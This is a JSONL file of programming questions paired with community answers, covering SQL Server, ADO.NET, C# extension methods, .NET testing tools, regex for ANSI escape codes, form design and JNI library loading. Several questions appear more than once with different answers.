{"instruction": "What is BODMAS and why is it useful in programming?", "output": "I'm not really sure how applicable to programming the old BODMAS mnemonic is anyways.  There is no guarantee on order of operations between languages, and while many keep the standard operations in that order, not all do.  And then there are some languages where order of operations isn't really all that meaningful (Lisp dialects, for example).  In a way, you're probably better off for programming if you forget the standard order and either use parentheses for everything(eg (a*b) + c) or specifically learn the order for each language you work in."}
{"instruction": "I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.\nI have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.\nTableA\nColumn1, Column2, Column3\n\nSQL Statement to ruturn\nResultA\nValue of Column1\nValue of Column2\nValue of Column3\n\n\n@Kevin: I've had a google search on the topic but alot of the example where overly complex for my example, are you able to help further?\n@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3", "output": "I had to do this for a project before. One of the major difficulties I had was explaining what I was trying to do to other people. I spent a ton of time trying to do this in SQL, but I found the pivot function woefully inadequate. I do not remember the exact reason why it was, but it is too simplistic for most applications, and it isn't full implemented in MS SQL 2000. I wound up writing a pivot function in .NET. I'll post it here in hopes it helps someone, someday. \n ''' <summary>    ''' Pivots a data table from rows to columns    ''' </summary>    ''' <param name=\"dtOriginal\">The data table to be transformed</param>    ''' <param name=\"strKeyColumn\">The name of the column that identifies each row</param>    ''' <param name=\"strNameColumn\">The name of the column with the values to be transformed from rows to columns</param>    ''' <param name=\"strValueColumn\">The name of the column with the values to pivot into the new columns</param>    ''' <returns>The transformed data table</returns>    ''' <remarks></remarks>    Public Shared Function PivotTable(ByVal dtOriginal As DataTable, ByVal strKeyColumn As String, ByVal strNameColumn As String, ByVal strValueColumn As String) As DataTable        Dim dtReturn As DataTable        Dim drReturn As DataRow        Dim strLastKey As String = String.Empty        Dim blnFirstRow As Boolean = True        ' copy the original data table and remove the name and value columns        dtReturn = dtOriginal.Clone        dtReturn.Columns.Remove(strNameColumn)        dtReturn.Columns.Remove(strValueColumn)        ' create a new row for the new data table        drReturn = dtReturn.NewRow        ' Fill the new data table with data from the original table        For Each drOriginal As DataRow In dtOriginal.Rows            ' Determine if a new row needs to be started            If drOriginal(strKeyColumn).ToString <> strLastKey Then                ' If this is not the first row, the previous row needs to be added to the new data table                If Not blnFirstRow Then                    dtReturn.Rows.Add(drReturn)                End If                blnFirstRow = False                drReturn = dtReturn.NewRow                ' Add all non-pivot column values to the new row                For Each dcOriginal As DataColumn In dtOriginal.Columns                    If dcOriginal.ColumnName <> strNameColumn AndAlso dcOriginal.ColumnName <> strValueColumn Then                        drReturn(dcOriginal.ColumnName.ToLower) = drOriginal(dcOriginal.ColumnName.ToLower)                    End If                Next                strLastKey = drOriginal(strKeyColumn).ToString            End If            ' Add new columns if needed and then assign the pivot values to the proper column            If Not dtReturn.Columns.Contains(drOriginal(strNameColumn).ToString) Then                dtReturn.Columns.Add(drOriginal(strNameColumn).ToString, drOriginal(strValueColumn).GetType)            End If            drReturn(drOriginal(strNameColumn).ToString) = drOriginal(strValueColumn)        Next        ' Add the final row to the new data table        dtReturn.Rows.Add(drReturn)        ' Return the transformed data table        Return dtReturn    End Function"}
{"instruction": "I have a Rakefile with a Rake task that I would normally call from the command line:\nrake blog:post Title\n\nI'd like to write a Ruby script that calls that Rake task multiple times, but the only solution I see is shelling out using `` (backticks) or system.\nWhat's the right way to do this?", "output": "from timocracy.com:\nrequire 'rake'\r\nrequire 'rake/rdoctask'\r\nrequire 'rake/testtask'\r\nrequire 'tasks/rails'\r\n\r\ndef capture_stdout\r\n  s = StringIO.new\r\n  oldstdout = $stdout\r\n  $stdout = s\r\n  yield\r\n  s.string\r\nensure\r\n  $stdout = oldstdout\r\nend\r\n\r\nRake.application.rake_require '../../lib/tasks/metric_fetcher'\r\nresults = capture_stdout {Rake.application['metric_fetcher'].invoke}"}
{"instruction": "If I'm adding a column to a table in Microsoft SQL Server, can I control where the column is displayed logically in queries?\nI don't want to mess with the physical layout of columns on disk, but I would like to logically group columns together when possible so that tools like SQL Server Management Studio list the contents of the table in a convenient way.\nI know that I can do this through SQL Management Studio by going into their \"design\" mode for tables and dragging the order of columns around, but I'd like to be able to do it in raw SQL so that I can perform the ordering scripted from the command line.", "output": "If I understand your question, you want to affect what columns are returned first, second, third, etc in existing queries, right?\nIf all of your queries are written with SELECT * FROM TABLE - then they will show up in the output as they are layed out in SQL. If your queries are written with SELECT Field1, Field2 FROM TABLE - then the order they are layed out in SQL does not matter."}
{"instruction": "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)", "output": "Go to http://www.fogbugz.com/ then at the bottom under \"Try It\", sign up.\nunder Settings => Your FogBugz Hosted Account, it should either already say \"Payment Information:    Using Student and Startup Edition.\" or there should be some option/link to turn on the Student and Startup Edition.\nAnd yes, it's not only for Students and Startups, I asked their support :-)\nDisclaimer: I'm not affiliated with FogCreek and Joel did not just deposit money in my account."}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "We use NUnit and MBUnit here. We use TestDriven.NET to run the unit tests from within Visual Studio. We use the excellent, highly recommended RhinoMocks as a mock framework."}
{"instruction": "I have a little game written in C#. It uses a database as back-end. It's \na trading card game, and I wanted to implement the function of the cards as a script.\nWhat I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\nNow, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\nIs that possible? Register a class from a source file and then instantiate it, etc.\nICard Cards[current] = new MyGame.CardLibrary.Card056();\nCards[current].OnEnterPlay(ref currentGameState);\n\nThe language is C#, but extra bonus if it's possible to write the script in any .NET language.", "output": "If you don't want to use the DLR you can use Boo (which has an interpreter) or you could consider the Script.NET (S#) project on CodePlex. With the Boo solution you can choose between compiled scripts or using the interpreter, and Boo makes a nice scripting language, has a flexible syntax and an extensible language via its open compiler architecture. Script.NET looks nice too, though, and you could easily extend that language as well as its an open source project and uses a very friendly Compiler Generator (Irony.net)."}
{"instruction": "I've been working on a project that accesses the WMI to get information about the software installed on a user's machine. We've been querying Win32_Product only to find that it doesn't exist in 64-bit versions of Windows because it's an \"optional component\".\nI know there are a lot of really good alternatives to querying the WMI for this information, but I've got a bit of a vested interest in finding out how well this is going to work out.\nWhat I want to know is if there's some kind of redistributable that can be packaged with our software to allow 64-bit users to get the WMI Installer Provider put onto their machines? Right now, they have to install it manually and the installation requires they have their Windows disc handy.\nEdit:\n\nYou didn't mention for what OS, but the WMI Redistributable Components version 1.0 definitely exists.\n\nFor Operation System, we've been using .NET 3.5 so we need packages that will work on XP64 and 64bit versions of Windows Vista.", "output": "You didn't mention for what OS, but the WMI Redistributable Components version 1.0 definitely exists.\nFor Windows Server 2003, the WMI SDK and redistributables are part of the Server SDK\nI believe that the same is true for the Server 2008 SDK"}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "I used to use NUnit, but I switched to MbUnit since it has more features.  I love RowTest.  It lets you parametrize your tests.  NUnit does have a litter bit better tool support though.  I am using ReSharper to run MbUnit Tests.  I've had problems with TestDriven.NET running my SetUp methods for MbUnit."}
{"instruction": "I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. \nAnyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.\nWhat's the best program you've used for such problems?", "output": "If you are talking about MS SQL Server tables, I like the diagram support in SQL Server Management Studio. You just drag the tables from the explorer onto the canvas, and they are laid out for you along with lines for relationships. You'll have to do some adjusting by hand for the best looking diagrams, but it is a decent way to get diagrams."}
{"instruction": "I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. \nAnyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.\nWhat's the best program you've used for such problems?", "output": "I am a big fan of Embarcadero's ER/Studio.  It is very powerful and produces excellent on-screen as well as printed results.  They have a free trial as well, so you should be able to get in and give it a shot without too much strife.\nGood luck!"}
{"instruction": "I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. \nAnyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.\nWhat's the best program you've used for such problems?", "output": "Toad Data Modeller from Quest does a nice job on this and is reasonably priced.  Embarcadero E/R studio is good too, as Bruce mentioned."}
{"instruction": "I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. \nAnyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.\nWhat's the best program you've used for such problems?", "output": "OP asked about diagramming views and view dependencies, SQL Management Studio and Enterprise Manager doesn't allow you to diagram views. I can't vouch for the other tools.\nThe LINQ to SQL designer for Visual Studio does allow you to drop views on the design surface but there isn't a easy way to model the dependencies between the views. I'm not sure which tool has this type of diagramming functionality. You could take a look at Red Gate's SQLDoc tool but it just provides text based output."}
{"instruction": "What code analysis tools do you use on your Java projects?\nI am interested in all kinds\n\nstatic code analysis tools (FindBugs, PMD, and any others)\ncode coverage tools (Cobertura, Emma, and any others)\nany other instrumentation-based tools \nanything else, if I'm missing something\n\nIf applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. \nIf a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.", "output": "We use FindBugs and JDepend integrated with Ant. We use JUnit but we're not using any coverage tool. \nI'm not using it integrated to Rational Application Developer (the IDE I'm using to develop J2EE applications) because I like how neat it looks when you run javac in the Windows console. :P"}
{"instruction": "I need to learn ADO.NET to build applications based on MS Office. I have read a good deal about ADO.NET in the MSDN Library, but everything seems rather messy to me.\nWhat are the basics one must figure out when using ADO.NET? I think a few key words will suffice to let me organize my learning.", "output": "There are three key components (assuming ur using SQL server):\n\nSQLConnection\nSqlCommand\nSqlDataReader\n\n(if you're using something else, replace Sql with \"Something\", like MySqlConnection, OracleCommand)\nEverything else is just built on top of that.\nExample 1:\nusing (SqlConnection connection = new SqlConnection(\"CONNECTION STRING\"))\nusing (SqlCommand command = new SqlCommand())\n{\n  command.commandText = \"SELECT Name FROM Users WHERE Status = @OnlineStatus\";\n  command.Connection = connection;\n  command.Parameters.Add(\"@OnlineStatus\", SqlDbType.Int).Value = 1; //replace with enum\n  connection.Open();\n\n  using (SqlDataReader dr = command.ExecuteReader))\n  {\n      List<string> onlineUsers = new List<string>();\n\n      while (dr.Read())\n      {\n         onlineUsers.Add(dr.GetString(0));\n      }\n  }\n}\n\nExample 2:\nusing (SqlConnection connection = new SqlConnection(\"CONNECTION STRING\"))\nusing (SqlCommand command = new SqlCommand())\n{\n  command.commandText = \"DELETE FROM Users where Email = @Email\";\n  command.Connection = connection;\n  command.Parameters.Add(\"@Email\", SqlDbType.VarChar, 100).Value = \"user@host.com\";\n  connection.Open();\n  command.ExecuteNonQuery();\n}"}
{"instruction": "I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:\nWhat is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?\nThe intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.\nEdit: Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.", "output": "The DataGrid was originally in .NET 1.0.  The GridView was introduced (and replaced the DataGrid) in .NET 2.0.  They provide nearly identical functionality."}
{"instruction": "I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:\nWhat is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?\nThe intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.\nEdit: Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.", "output": "DataGrid was an ASP.NET 1.1 control, still supported. GridView arrived in 2.0, made certain tasks simpler added different databinding features:\nThis link has a comparison of DataGrid and GridView features -\nhttps://msdn.microsoft.com/en-us/library/05yye6k9(v=vs.100).aspx"}
{"instruction": "Is it \"acceptable\" to have an ASP.Net 2.0 application without the BLL (Business Logic Layer) as the following?\n\nSQL Server Data Storage & Stored Procedures\nData Link Layer (Strongly Typed Table Adapters) connecting to Stored Procs\nPresentation Layer ASPX Pages with Code behind and ObjectDataSource for connection straight to the DLL\n\nIs a BLL always preferable, even if business logic is entirely validatable in the presentation's code behind?  What are the potential drawbacks for not using a BLL?", "output": "Like everything else it is environmental and depends on the use of the system.  The question you need to ask your self is:\n\nWill this be actively developed\nIs this going to be used over the course of many years and expanded on\nIs the expansion of the application unknown and thus infinite\n\nReally it comes down to laziness.  How much time to do you want to spend reworking the system from the UI?  Because having no business layer means duplication of rules in your UI across possibility many many pages.\nThen again if this is a proof of concept or short demo or class project.  Take the easy way out."}
{"instruction": "Is it \"acceptable\" to have an ASP.Net 2.0 application without the BLL (Business Logic Layer) as the following?\n\nSQL Server Data Storage & Stored Procedures\nData Link Layer (Strongly Typed Table Adapters) connecting to Stored Procs\nPresentation Layer ASPX Pages with Code behind and ObjectDataSource for connection straight to the DLL\n\nIs a BLL always preferable, even if business logic is entirely validatable in the presentation's code behind?  What are the potential drawbacks for not using a BLL?", "output": "It's acceptable as long as you understand the consequences. The main reason you'd have a BLL is to re-use that logic elsewhere throughout your application.\nIf you have all that validation logic in the presentation code, you're really making it difficult to re-use elsewhere within your application."}
{"instruction": "Is it \"acceptable\" to have an ASP.Net 2.0 application without the BLL (Business Logic Layer) as the following?\n\nSQL Server Data Storage & Stored Procedures\nData Link Layer (Strongly Typed Table Adapters) connecting to Stored Procs\nPresentation Layer ASPX Pages with Code behind and ObjectDataSource for connection straight to the DLL\n\nIs a BLL always preferable, even if business logic is entirely validatable in the presentation's code behind?  What are the potential drawbacks for not using a BLL?", "output": "Acceptable? Depends who you ask and what your requirements are. Is this app an internal one-off used by you and a few other people? Maybe this is good enough. If it's meant to be a production ready enterprise application that will grow and be maintained over the years, then you probably want to invest more effort up-front to build a maintainable app.\nSeparation of Concerns is a key design technique for building maintainable apps. By mixing presentation, business, and data access logic all together, you can end up with a very fragile difficult to change application architecture."}
{"instruction": "I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.\nWithout doing this you get the error message that the application configuration is not correct and to reinstall.", "output": "If you are looking to find out which dll's your target machine is missing then use depends.exe which used to come with MSDev, but can also be found here. Testing this on a few target machines should tell you which dll's you need to package with your application."}
{"instruction": "Is there available any tool for PHP which can be used to generate code for consuming a web service based on its WSDL? Something comparable to clicking \"Add Web Reference\" in Visual Studio or the Eclipse plugin which does the same thing for Java.", "output": "Well, those features are specific to a tool that you are using for development in those languages.\nYou wouldn't have those tools if (for example) you were using notepad to write code. So, maybe you should ask the question for the tool you are using.\nFor PHP: http://webservices.xml.com/pub/a/ws/2004/03/24/phpws.html"}
{"instruction": "What code analysis tools do you use on your Java projects?\nI am interested in all kinds\n\nstatic code analysis tools (FindBugs, PMD, and any others)\ncode coverage tools (Cobertura, Emma, and any others)\nany other instrumentation-based tools \nanything else, if I'm missing something\n\nIf applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. \nIf a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.", "output": "Checkstyle is another one I've used at a previous company... it's mainly for style checking, but it can do some static analysis too.  Also, Clover for code coverage, though be aware it is not a free tool."}
{"instruction": "What code analysis tools do you use on your Java projects?\nI am interested in all kinds\n\nstatic code analysis tools (FindBugs, PMD, and any others)\ncode coverage tools (Cobertura, Emma, and any others)\nany other instrumentation-based tools \nanything else, if I'm missing something\n\nIf applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. \nIf a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.", "output": "We are using FindBugs and Checkstyle as well as Clover for Code Coverage. \nI think it's important to have some kind of static analysis, supporting your development. Unfortunately it's still not widely spread that these tools are important."}
{"instruction": "How is it possible to make prototype methods in C#.Net?\nIn JavaScript, I can do the following to create a trim method for the string object:\nString.prototype.trim = function() {\n    return this.replace(/^\\s+|\\s+$/g,\"\");\n}\n\nHow can I go about doing this in C#.Net?", "output": "You need to create an extension method, which requires .NET 3.5. The method needs to be static, in a static class. The first parameter of the method needs to be prefixed with \"this\" in the signature.\npublic static string MyMethod(this string input){    // do things}\nYou can then call it like\n\"asdfas\".MyMethod();"}
{"instruction": "How is it possible to make prototype methods in C#.Net?\nIn JavaScript, I can do the following to create a trim method for the string object:\nString.prototype.trim = function() {\n    return this.replace(/^\\s+|\\s+$/g,\"\");\n}\n\nHow can I go about doing this in C#.Net?", "output": "You can't dynamically add methods to existing objects or classes in .NET, except by changing the source for that class.\nYou can, however, in C# 3.0, use extension methods, which look like new methods, but are compile-time magic.\nTo do this for your code:\npublic static class StringExtensions{    public static String trim(this String s)    {        return s.Trim();    }}\nTo use it:\nString s = \"  Test  \";s = s.trim();\nThis looks like a new method, but will compile the exact same way as this code:\nString s = \"  Test  \";s = StringExtensions.trim(s);\nWhat exactly are you trying to accomplish? Perhaps there are better ways of doing what you want?"}
{"instruction": "How is it possible to make prototype methods in C#.Net?\nIn JavaScript, I can do the following to create a trim method for the string object:\nString.prototype.trim = function() {\n    return this.replace(/^\\s+|\\s+$/g,\"\");\n}\n\nHow can I go about doing this in C#.Net?", "output": "Using the 3.5 compiler you can use an Extension Method:\npublic static void Trim(this string s){  // implementation}\nYou can use this on a CLR 2.0 targeted project (3.5 compiler) by including this hack:\nnamespace System.Runtime.CompilerServices{  [AttributeUsage(AttributeTargets.Method | AttributeTargets.Class | AttributeTargets.Assembly)]  public sealed class ExtensionAttribute : Attribute  {  }}"}
{"instruction": "How is it possible to make prototype methods in C#.Net?\nIn JavaScript, I can do the following to create a trim method for the string object:\nString.prototype.trim = function() {\n    return this.replace(/^\\s+|\\s+$/g,\"\");\n}\n\nHow can I go about doing this in C#.Net?", "output": "It sounds like you're talking about C#'s Extension Methods. You add functionality to existing classes by inserting the \"this\" keyword before the first parameter. The method has to be a static method in a static class. Strings in .NET already have a \"Trim\" method, so I'll use another example.public static class MyStringEtensions\r\n{\r\n    public static bool ContainsMabster(this string s)\r\n    {\r\n        return s.Contains(\"Mabster\");\r\n    }\r\n}\r\n\nSo now every string has a tremendously useful ContainsMabster method, which I can use like this:if (\"Why hello there, Mabster!\".ContainsMabster()) { /* ... */ }\r\n\nNote that you can also add extension methods to interfaces (eg IList), which means that any class implementing that interface will also pick up that new method.\nAny extra parameters you declare in the extension method (after the first \"this\" parameter) are treated as normal parameters."}
{"instruction": "So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with \"install cygwin...\".  Now I've heard that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.\r\nCan I get any recommendations?", "output": "EDIT: Perhaps add a \"dvcs\", \"distrubutedversioncontrol\", \"distrubuted\"\nI've used Mercurial on Windows with no problems. You can use TortoiseHG or just use the command line. Mercurial does require Python, but that is easy to install in Windows as well.\nMercurial Binary Packages"}
{"instruction": "I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?", "output": "I wrote a PowerShell provider to give me access to IE7's RSS feed store, and had lots of fun with it. It lets me cd to a drive called feed: and navigate around folders and feeds using cd and dir. It even lets you add or remove feeds from the command line. \nSee this post on my blog as an example:\nGetting the Most Prolific Authors in your Feeds\nIt's rolled up into the PowerShell Community Extensions project nowadays, which you can find on CodePlex here."}
{"instruction": "So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with \"install cygwin...\".  Now I've heard that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.\r\nCan I get any recommendations?", "output": "I use msys-git on windows every single day. Works fast and flawlessly.\nAlthough the newer build has some problems with git-svn, this build (Git-1.5.5-preview20080413.exe) has a working git-svn."}
{"instruction": "I'm writing a Telnet client of sorts in C# and part of what I have to parse are ANSI/VT100 escape sequences, specifically, just those used for colour and formatting (detailed here).\nOne method I have is one to find all the codes and remove them, so I can render the text without any formatting if needed:\n    \npublic static string StripStringFormating(string formattedString)\n{\n    if (rTest.IsMatch(formattedString))\n        return rTest.Replace(formattedString, string.Empty);\n    else\n        return formattedString;\n}\n\nI'm new to regular expressions and I was suggested to use this:\nstatic Regex rText = new Regex(@\"\\e\\[[\\d;]+m\", RegexOptions.Compiled);\nHowever, this failed if the escape code was incomplete due to an error on the server. So then this was suggested, but my friend warned it might be slower (this one also matches another condition (z) that I might come across later):\nstatic Regex rTest = \n              new Regex(@\"(\\e(\\[([\\d;]*[mz]?))?)?\", RegexOptions.Compiled);\nThis not only worked, but was in fact faster to and reduced the impact on my text rendering. Can someone explain to a regexp newbie, why? :)", "output": "Without doing detailed analysis, I'd guess that it's faster because of the question marks. These allow the regular expression to be \"lazy,\" and stop as soon as they have enough to match, rather than checking if the rest of the input matches.\nI'm not entirely happy with this answer though, because this mostly applies to question marks after * or +. If I were more familiar with the input, it might make more sense to me.\n(Also, for the code formatting, you can select all of your code and press Ctrl+K to have it add the four spaces required.)"}
{"instruction": "My organization has a form to allow users to update their email address with us.\r\nIt's suggested that we have two input boxes for email: the second as an email confirmation.\nI always copy/paste my email address when faced with the confirmation.\r\nI'm assuming most of our users are not so savvy.\nRegardless, is this considered a good practice?\r\nI can't stand it personally, but I also realize it probably isn't meant for me.\r\nIf someone screws up their email, they can't login, and they must call to sort things out.", "output": "I agree with you in that it is quite an annoyance to me (I also copy and paste my address into the second input).\nThat being said, for less savvy users, it is probably a good idea. Watching my mother type is affirmation that many users do not look at the screen when they type (when she's using her laptop she resembles Linus from Peanuts when he's playing the piano).  If it's important for you to have the user's correct email address then I would say having a confirmation input is a very good idea (one of these days I'll probably type my email address wrong in the first box and paste it wrong into the second box and then feel like a complete idiot)."}
{"instruction": "My organization has a form to allow users to update their email address with us.\r\nIt's suggested that we have two input boxes for email: the second as an email confirmation.\nI always copy/paste my email address when faced with the confirmation.\r\nI'm assuming most of our users are not so savvy.\nRegardless, is this considered a good practice?\r\nI can't stand it personally, but I also realize it probably isn't meant for me.\r\nIf someone screws up their email, they can't login, and they must call to sort things out.", "output": "I would just use one input box. The \"Confirm\" input is a remnant form the \"Confirm Password\" method. \nWith passwords, this is useful because they are usually typed as little circles. So, you can't just look at it to make sure that you typed it correctly. \nWith a regular text box, you can visually check your input. So, there is no need for a confirmation input box."}
{"instruction": "My organization has a form to allow users to update their email address with us.\r\nIt's suggested that we have two input boxes for email: the second as an email confirmation.\nI always copy/paste my email address when faced with the confirmation.\r\nI'm assuming most of our users are not so savvy.\nRegardless, is this considered a good practice?\r\nI can't stand it personally, but I also realize it probably isn't meant for me.\r\nIf someone screws up their email, they can't login, and they must call to sort things out.", "output": "I agree with Justin, while most technical folks will use the copy, paste method, for the less savvy users it is a good practice.\nOne more thing that I would add is that the second field should have the auto-complete feature disabled.  This ensures that there is human input from either method on at least one of the fields."}
{"instruction": "My organization has a form to allow users to update their email address with us.\r\nIt's suggested that we have two input boxes for email: the second as an email confirmation.\nI always copy/paste my email address when faced with the confirmation.\r\nI'm assuming most of our users are not so savvy.\nRegardless, is this considered a good practice?\r\nI can't stand it personally, but I also realize it probably isn't meant for me.\r\nIf someone screws up their email, they can't login, and they must call to sort things out.", "output": "I'd say that this is ok but should only be reserved for forms where the email is essential. If you mistype your email for your flight booking then you have severed the two-way link between yourself and the other party and risk not getting the confirmation number, here on StackOverflow it would only mean your Gravatar would not be loaded ...\nI'd consider myself fairly techie but I always fill in both fields /wo cut-paste if I regard it to be important enough."}
{"instruction": "I'm writing a Telnet client of sorts in C# and part of what I have to parse are ANSI/VT100 escape sequences, specifically, just those used for colour and formatting (detailed here).\nOne method I have is one to find all the codes and remove them, so I can render the text without any formatting if needed:\n    \npublic static string StripStringFormating(string formattedString)\n{\n    if (rTest.IsMatch(formattedString))\n        return rTest.Replace(formattedString, string.Empty);\n    else\n        return formattedString;\n}\n\nI'm new to regular expressions and I was suggested to use this:\nstatic Regex rText = new Regex(@\"\\e\\[[\\d;]+m\", RegexOptions.Compiled);\nHowever, this failed if the escape code was incomplete due to an error on the server. So then this was suggested, but my friend warned it might be slower (this one also matches another condition (z) that I might come across later):\nstatic Regex rTest = \n              new Regex(@\"(\\e(\\[([\\d;]*[mz]?))?)?\", RegexOptions.Compiled);\nThis not only worked, but was in fact faster to and reduced the impact on my text rendering. Can someone explain to a regexp newbie, why? :)", "output": "The reason why #1 is slower is that [\\d;]+ is a greedy quantifier. Using +? or *? is going to do lazy quantifing. See MSDN - Quantifiers for more info.\nYou may want to try:\n\"(\\e\\[(\\d{1,2};)*?[mz]?)?\"\nThat may be faster for you."}
{"instruction": "My organization has a form to allow users to update their email address with us.\r\nIt's suggested that we have two input boxes for email: the second as an email confirmation.\nI always copy/paste my email address when faced with the confirmation.\r\nI'm assuming most of our users are not so savvy.\nRegardless, is this considered a good practice?\r\nI can't stand it personally, but I also realize it probably isn't meant for me.\r\nIf someone screws up their email, they can't login, and they must call to sort things out.", "output": "As long as a field is viewable, you do not need a confirm box. As long as you do some form validation to be sure that  it is at least in valid format for an email address let the user manage the rest of the issues."}
{"instruction": "My organization has a form to allow users to update their email address with us.\r\nIt's suggested that we have two input boxes for email: the second as an email confirmation.\nI always copy/paste my email address when faced with the confirmation.\r\nI'm assuming most of our users are not so savvy.\nRegardless, is this considered a good practice?\r\nI can't stand it personally, but I also realize it probably isn't meant for me.\r\nIf someone screws up their email, they can't login, and they must call to sort things out.", "output": "I've seen plenty of people type their email address wrong and I've also looked through user databases full of invalid email address.\nThe way I see it you've got two options.  Use a second box to confirm the input, or send an authentication/activation email.\nBoth are annoyances so you get to choose which you think will annoy your users less.\nMost would argue that having to find an email and click on a link is more annoying, but it avoids the copy/paste a bad address issue, and it allows you to do things like delete or roll back users if they don't activate after say 48 hours."}
{"instruction": "I am new to C# and am doing some work in an existing application. I have a DirectX viewport that has components in it that I want to be able to position using arrow keys.\nCurrently I am overriding ProcessCmdKey and catching arrow input and send an OnKeyPress event. This works, but I want to be able to use modifiers(ALT+CTRL+SHIFT). As soon as I am holding a modifier and press an arrow no events are triggered that I am listening to.\nDoes anyone have any ideas or suggestions on where I should go with this?", "output": "Within your overridden ProcessCmdKey how are you determining which key has been pressed?\nThe value of keyData (the second parameter) will change dependant on the key pressed and any modifier keys, so, for example, pressing the left arrow will return code 37, shift-left will return 65573, ctrl-left 131109 and alt-left 262181.\nYou can extract the modifiers and the key pressed by ANDing with appropriate enum values:protected override bool ProcessCmdKey(ref Message msg, Keys keyData)\r\n{\r\n    bool shiftPressed = (keyData & Keys.Shift) != 0;\r\n    Keys unmodifiedKey = (keyData & Keys.KeyCode);\r\n\r\n    // rest of code goes here\r\n}"}
{"instruction": "Example: I have two shared objects (same should apply to .dlls). The first shared object is from a third-party library, we'll call it libA.so. I have wrapped some of this with JNI and created my own library, libB.so. Now libB depends on libA.\nWhen webstarting, both libraries are places in some webstart working area. My java code attempts to load libB. At this point the system loader will attempt to load libA which is not in the system library path (java.library.path won't help this). The end result is that libB has an unsatisfied link and cannot be used. \nI have tried loading libA before libB, but that still does not work. Seems the OS wants to do that loading for me. Is there any way I can make this work other than statically  compiling?", "output": "I'm not sure if this would be handled exactly the same way for webstart, but we ran into this situation in a desktop application when dealing with a set of native libraries (dlls in our case).\nLoading libA before libB should work, unless one of those libraries has a dependency that is unaccounted for and not in the path. My understanding is that once it gets to a system loadLibrary call (i.e. Java has found the library in its java.library.path and is now telling the OS to load it) - it is completely dependent on the operating system to find any dependent libraries, because at that point it is the operating system that is loading the library for the process, and the OS only knows how to look in the system path. That seems hard to set in the case of a Webstart app, but there is a way around this that does not involve static compiling. You may be able to shuffle where your libraries are - I am unsure \nIf you use a custom classloader, you can override loadLibrary and findLibrary so that it can locate your libraries from within a jar in your classpath, and if you also make it aware of your native library dependencies (i.e. libB depends on libA depends on libX, then when loading libB you can catch yourself and ensure you load libA first, and in checking that notice and load libX first. Then the OS doesn't try to find a library that isn't in your path. It's klunky and a bit painful, but ensuring Java finds them and loads them all in the correct order can work."}
{"instruction": "I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?\nNot there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.", "output": "TOAD for MS SQL looks pretty good.  I've never used it personally but I have used Quest's other products and they're solid."}
